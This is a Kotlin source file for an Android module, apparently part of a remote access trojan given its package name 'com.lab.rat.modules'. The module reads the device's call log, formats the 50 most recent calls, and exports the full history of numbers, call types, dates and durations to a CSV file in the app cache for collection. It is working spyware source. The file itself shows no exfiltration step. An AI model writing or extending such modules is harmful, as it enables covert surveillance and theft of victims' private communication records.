package com.lab.rat.modules

import android.content.Context
import android.provider.CallLog
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object CallLogModule {
    private val fmt = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)

    private fun typeStr(t: Int) = when (t) {
        CallLog.Calls.INCOMING_TYPE -> "entrada"
        CallLog.Calls.OUTGOING_TYPE -> "saida"
        CallLog.Calls.MISSED_TYPE -> "perdida"
        else -> "outro($t)"
    }

    fun list(ctx: Context): String {
        val sb = StringBuilder()
        var n = 0
        ctx.contentResolver.query(CallLog.Calls.CONTENT_URI,
            arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE,
                CallLog.Calls.DATE, CallLog.Calls.DURATION),
            null, null, "date DESC")?.use { c ->
            while (c.moveToNext() && n < 50) {
                sb.append("[${fmt.format(Date(c.getLong(2)))}] " +
                        "${c.getString(0) ?: "?"} - " +
                        "${typeStr(c.getInt(1))} (${c.getLong(3)}s)\n")
                n++
            }
        }
        if (n == 0) return "Nenhuma chamada"
        return "Últimas $n chamadas:\n$sb"
    }

    fun export(ctx: Context): File? {
        val rows = mutableListOf<String>()
        ctx.contentResolver.query(CallLog.Calls.CONTENT_URI,
            arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE,
                CallLog.Calls.DATE, CallLog.Calls.DURATION),
            null, null, "date DESC")?.use { c ->
            while (c.moveToNext()) {
                rows.add("${c.getString(0) ?: ""},${typeStr(c.getInt(1))}," +
                        "${fmt.format(Date(c.getLong(2)))},${c.getLong(3)}")
            }
        } ?: return null
        if (rows.isEmpty()) return null
        val f = File(ctx.cacheDir, "calls_${System.currentTimeMillis()}.csv")
        f.writeText("numero,tipo,data,duracao_s\n" + rows.joinToString("\n"))
        return f
    }
}
